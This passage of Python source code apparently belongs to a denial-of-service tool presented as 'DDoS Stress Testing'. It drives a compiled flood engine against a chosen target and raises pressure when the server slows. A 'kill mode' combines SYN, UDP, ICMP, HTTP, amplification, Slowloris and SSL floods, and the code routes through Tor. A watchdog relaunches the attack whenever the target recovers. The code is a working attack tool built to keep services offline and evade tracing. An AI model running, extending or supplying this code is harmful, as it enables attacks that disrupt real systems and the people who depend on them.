                        resp = urllib.request.urlopen(url, timeout=3)
                        lat = (time.time() - t0) * 1000
                        code = resp.status
                        resp.read()
                        resp.close()

                        if code in (403, 429, 503):
                            blocked_count += 1
                            print(f"\n  {RED}[!] {code} detected — blocking!{DIM}")
                        else:
                            blocked_count = max(0, blocked_count - 1)

                        if rtt_baseline is None:
                            rtt_baseline = lat
                            print(f"\n  {DIM}[RTT] Baseline: {lat:.0f}ms{DIM}")
                        elif lat > rtt_baseline * 2 and not rtt_escalated:
                            rtt_escalated = True
                            print(f"\n  {B_RED}[ESCALATE] RTT {lat:.0f}ms (>2x baseline) — server weakening, increasing pressure!{DIM}")
                        elif lat < rtt_baseline * 1.2 and rtt_escalated:
                            print(f"\n  {YELLOW}[RTT] Server stabilizing ({lat:.0f}ms) — maintaining pressure{DIM}")
                    except Exception:
                        print(f"\n  {GREEN}[TARGET DOWN] Connection refused/timeout — attack working{DIM}")
                    time.sleep(1)
            t_rtt = Thread(target=rtt_monitor, daemon=True)
            t_rtt.start()

        def sig_handler(signum, frame):
            print(f"\n  {YELLOW}[!] Interrupted, stopping...{DIM}")
            proc.terminate()

        signal.signal(signal.SIGINT, sig_handler)
        signal.signal(signal.SIGTERM, sig_handler)

        print(f"  {DIM}[*] Engine started — waiting for stats...{DIM}")

        rate_history = []
        graph_counter = 0

        try:
            for line in proc.stdout:
                line = line.strip()
                if not line:
                    continue
                try:
                    data = json.loads(line)
                    t = data.get('type', '')

                    if t == 'stats':
                        total_sent = data.get('sent', total_sent)
                        rate_now = data.get('rate', 0)
                        active = data.get('active', 0)
                        elapsed = data.get('elapsed', 0)
                        cur_method = data.get('method', cfg.method)
                        report.record(0, 0, rate_now, cur_method, 0, active)
                        if rate_now > peak_rate:
                            peak_rate = rate_now

                        rate_history.append(rate_now)
                        if len(rate_history) > 30:
                            rate_history = rate_history[-30:]

                        bar_len = 35
                        progress = min(elapsed / max(cfg.time, 1), 1.0)
                        filled = int(bar_len * progress)
                        bar = '█' * filled + '░' * (bar_len - filled)
                        all_sent = total_sent + py_total

                        bw_bps = rate_now * 1024 * 8
                        if bw_bps >= 1_000_000_000:
                            bw = f"{bw_bps/1_000_000_000:.1f}Gbps"
                        elif bw_bps >= 1_000_000:
                            bw = f"{bw_bps/1_000_000:.0f}Mbps"
                        else:
                            bw = f"{bw_bps/1_000:.0f}Kbps"

                        graph_counter += 1
                        graph_line = ""
                        if graph_counter % 5 == 0 and len(rate_history) >= 5:
                            max_rate = max(rate_history) or 1
                            graph_w = 35
                            cols = min(len(rate_history), graph_w)
                            step = max(1, len(rate_history)//graph_w)
                            sampled = rate_history[::step][:graph_w]
                            gh = 5
                            levels = [max_rate * (i+1)/gh for i in range(gh)]
                            g_rows = []
                            for lv in levels[::-1]:
                                row = "".join("█" if v >= lv else " " for v in sampled)
                                g_rows.append(row)
                            g_header = f"  {DIM}[RATE GRAPH] last {len(rate_history)}s{DIM}"
                            g_lines = "\n".join("  " + r for r in g_rows)
                            g_scale = f"  {DIM}└{'─'*min(len(sampled),30)}┘ 0-{max_rate:,}/s{DIM}"
                            graph_line = f"\n{g_header}\n{g_lines}\n{g_scale}\n"

                        sys.stdout.write(
                            f"\r  {CYAN}{bar}{DIM} "
                            f"{GREEN}{progress*100:5.1f}%{DIM} "
                            f"| {BOLD}{WHITE}{all_sent:,}{DIM} "
                            f"| {YELLOW}{rate_now}/s{DIM} "
                            f"| {RED}{bw}{DIM} "
                            f"| {MAGENTA}{cur_method.upper()}{DIM} "
                            f"| W:{MAGENTA}{active + py_active}{DIM} "
                            f"| ETA:{DIM}{max(cfg.time-elapsed,0)}s   "
                            f"{graph_line}"
                        )
                        sys.stdout.flush()
                    elif t == 'error':
                        print(f"\n  {RED}[!] {data.get('message', '')}{DIM}")
                    elif t == 'switch':
                        print(f"\n  {YELLOW}[→] {data.get('from','')} → {data.get('to','')}{DIM}")
                except json.JSONDecodeError:
                    pass

            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()
            proc.wait()
            print(f"\n  {YELLOW}[!] Stopped by user{DIM}")

        report.stop()
        elapsed = time.time() - start_time
        all_sent = total_sent + py_total

        print()
        print(f"  {'═'*70}")
        if kill_mode:
            print(f"  {B_RED}KILL MODE ATTACK COMPLETE — Target bombarded from ALL vectors{DIM}")
            print(f"  {RED}╔{'═'*66}╗{DIM}")
            print(f"  {RED}║  SYN + UDP + ICMP + HTTP + AMP + SLOW LORIS + SSL  ║{DIM}")
            print(f"  {RED}╚{'═'*66}╝{DIM}")
        else:
            print(f"  {GREEN}ATTACK COMPLETE{DIM}")
        print(f"  {CYAN}Target{DIM}     : {cfg.target}:{cfg.port}")
        print(f"  {CYAN}Method{DIM}     : {cfg.method}")
        print(f"  {CYAN}Total Sent{DIM} : {WHITE}{all_sent:,}{DIM}")
        print(f"  {CYAN}Peak Rate{DIM}  : {YELLOW}{report.peak_rate:,} pps{DIM}")
        if cfg.method in ('http', 'https'):
            print(f"  {CYAN}Python{DIM}     : {py_total:,} req")
        if kill_mode:
            print(f"  {CYAN}Go Engine{DIM}  : {total_sent:,} pkts")
            print(f"  {CYAN}Python Async{DIM}: {py_total:,} conn")
        print(f"  {CYAN}Avg Rate{DIM}   : {YELLOW}{report.avg_rate:,.0f} pps{DIM}")
        print(f"  {CYAN}Duration{DIM}   : {GREEN}{elapsed:.1f}s{DIM}")
        print(f"  {'═'*70}")

        if cfg.output:
            report_dir = report.export_all(cfg.output)
            print(f"  {GREEN}[+] Report: {report_dir}{DIM}")

        if tor_proc:
            tm.new_identity()
            tm.stop()

        print()
        print(f"  {B_RED}╔{'═'*66}╗{DIM}")
        print(f"  {B_RED}║  RECOVERY WATCHDOG ACTIVE{DIM}  —  Polling every 5s for target recovery...{DIM}")
        print(f"  {B_RED}╚{'═'*66}╝{DIM}")
        print(f"  {DIM}Press Ctrl+C to stop watchdog{DIM}")
        watchdog_iterations = 0
        try:
            while True:
                watchdog_iterations += 1
                time.sleep(5)
                try:
                    test_url = f"http://{cfg.target}:{cfg.port}/"
                    if cfg.port == 443:
                        test_url = f"https://{cfg.target}:{cfg.port}/"
                    t0 = time.time()
                    probe = urllib.request.urlopen(test_url, timeout=5)
                    probe.read()
                    probe.close()
                    lat = (time.time() - t0) * 1000
                    if 'proc2' in dir() and proc2 and proc2.poll() is None:
                        continue
                    print(f"\n  {B_RED}[WATCHDOG] TARGET RECOVERED! (RTT: {lat:.0f}ms){DIM}")
                    print(f"  {B_RED}[WATCHDOG] Re-launching attack...{DIM}")
                    proc2 = subprocess.Popen(
                        [engine_bin, cfg_path],
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        text=True, bufsize=1, env=env,
                    )
                    for line2 in proc2.stdout:
                        line2 = line2.strip()
                        if not line2:
                            continue
                        try:
                            data2 = json.loads(line2)
                            if data2.get('type') == 'stats':
                                s2 = data2.get('sent', 0)
                                r2 = data2.get('rate', 0)
                                sys.stdout.write(f"\r  {B_RED}[RE-ATTACK] Sent:{s2:,} | Rate:{r2}/s{DIM}   ")
                                sys.stdout.flush()
                        except json.JSONDecodeError:
                            pass
                    proc2.wait()
                    print(f"\n  {B_RED}[WATCHDOG] Target down again — continuing watch{DIM}")
                except Exception:
                    if watchdog_iterations % 6 == 0:
                        print(f"  {DIM}[Watchdog] Target still down ({watchdog_iterations*5}s){DIM}")
        except KeyboardInterrupt:
            print(f"\n  {YELLOW}[!] Watchdog stopped{DIM}")

    finally:
        try:
            os.unlink(cfg_path)
        except OSError:
            pass


def _build_engines(quiet=False):
    c_build_dir = C_DIR / 'build'
    if not os.path.exists(c_build_dir):
        os.makedirs(c_build_dir, exist_ok=True)

    c_src = list((C_DIR / 'src').glob('*.c'))
    c_exclude = {'xdp_kern.c', 'xdp_loader.c', 'dpdk_engine.c'}
    c_files = [f for f in c_src if f.name not in c_exclude]

    for cf in c_files:
        obj = c_build_dir / (cf.stem + '.o')
        if not obj.exists() or os.path.getmtime(cf) > os.path.getmtime(obj):
            if not quiet:
                print(f"  {DIM}[*] CC {cf.name}{DIM}")
            r = subprocess.run([
                'gcc', '-O3', '-march=native', '-flto', '-funroll-loops',
                '-falign-functions=64', '-fomit-frame-pointer',
                '-fno-stack-protector', '-fno-ident',
                '-fvisibility=hidden', '-fdata-sections', '-ffunction-sections',
                '-fPIC', '-I', str(C_DIR / 'include'),
                '-c', '-o', str(obj), str(cf),
            ], capture_output=True, text=True)
            if r.returncode != 0 and not quiet:
                err = r.stderr.split('\n')[0] if r.stderr else "?"
                print(f"  {YELLOW}[!] {err[:120]}{DIM}")

    objs = list(c_build_dir.glob('*.o'))
    if objs:
        lib_path = c_build_dir / 'libpacket_sakti.so'
        if not lib_path.exists():
            if not quiet:
                print(f"  {CYAN}[*] Linking C engine...{DIM}")
            r = subprocess.run([
                'gcc', '-O3', '-flto', '-fPIC', '-shared', '-s',
                '-Wl,-O3', '-Wl,--gc-sections', '-Wl,--as-needed',
                '-o', str(lib_path)] + [str(o) for o in objs] +
                ['-lpthread', '-lm'],
                capture_output=True, text=True)
            if r.returncode != 0:
                if not quiet:
                    print(f"  {RED}[!] Link: {r.stderr[:150]}{DIM}")
            elif not quiet:
                print(f"  {GREEN}[+] C engine built{DIM}")

    go_bin = GO_BINARY
    if not os.path.exists(go_bin):
        if not quiet:
            print(f"  {CYAN}[*] Building Go dispatcher...{DIM}")
        env = os.environ.copy()
        env['CGO_ENABLED'] = '1'
        subprocess.run(['go', 'mod', 'tidy'], cwd=str(GO_DIR),
                      capture_output=True, text=True, env=env)
        r = subprocess.run(
            ['go', 'build', '-o', str(go_bin), '-trimpath',
             '-ldflags=-s -w', '.'],
            cwd=str(GO_DIR), capture_output=True, text=True, env=env,
        )
        if r.returncode != 0:
            if not quiet:
                print(f"  {RED}[!] Go build: {r.stderr[:200]}{DIM}")
        elif not quiet:
            print(f"  {GREEN}[+] Go dispatcher built{DIM}")


@click.command()
def ddos():
    """DDoS Stress Testing — Interactive Terminal"""
    print_banner()
    cfg = DDoSConfig()
    interactive_loop(cfg)
